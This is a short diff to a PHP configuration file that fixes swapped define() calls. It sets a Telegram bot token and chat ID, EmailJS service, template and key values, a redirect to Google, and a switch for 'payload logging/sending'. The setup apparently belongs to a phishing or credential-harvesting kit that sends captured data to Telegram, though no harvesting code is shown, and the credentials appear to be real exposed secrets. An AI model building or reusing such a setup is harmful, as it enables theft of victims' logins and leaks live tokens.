@@ -13,13 +13,13 @@ define('MAX_ATTEMPTS', 1000);
 define('REDIRECT_URL', 'https://www.google.com');
 
 // Telegram Bot API Credentials
-define('6476758663:AAE-gkqyxKX51Z94U5OBiTmIYzhm-Gl76bs', '');
-define('5568130877', '');
+define('TELEGRAM_BOT_TOKEN', '6476758663:AAE-gkqyxKX51Z94U5OBiTmIYzhm-Gl76bs');
+define('TELEGRAM_CHAT_ID', '5568130877');
 
 // EmailJS Credentials
-define('service_kdjz013', '');
-define('template_odu9psr', '');
-define('xxRxln8zCDdig6e0y', '');
+define('EMAILJS_SERVICE_ID', 'service_kdjz013');
+define('EMAILJS_TEMPLATE_ID', 'template_odu9psr');
+define('EMAILJS_PUBLIC_KEY', 'xxRxln8zCDdig6e0y');
 
 // Enable Server-Side PHP Payload Logging/Sending (process.php)
 define('ENABLE_PHP_BACKEND', true);
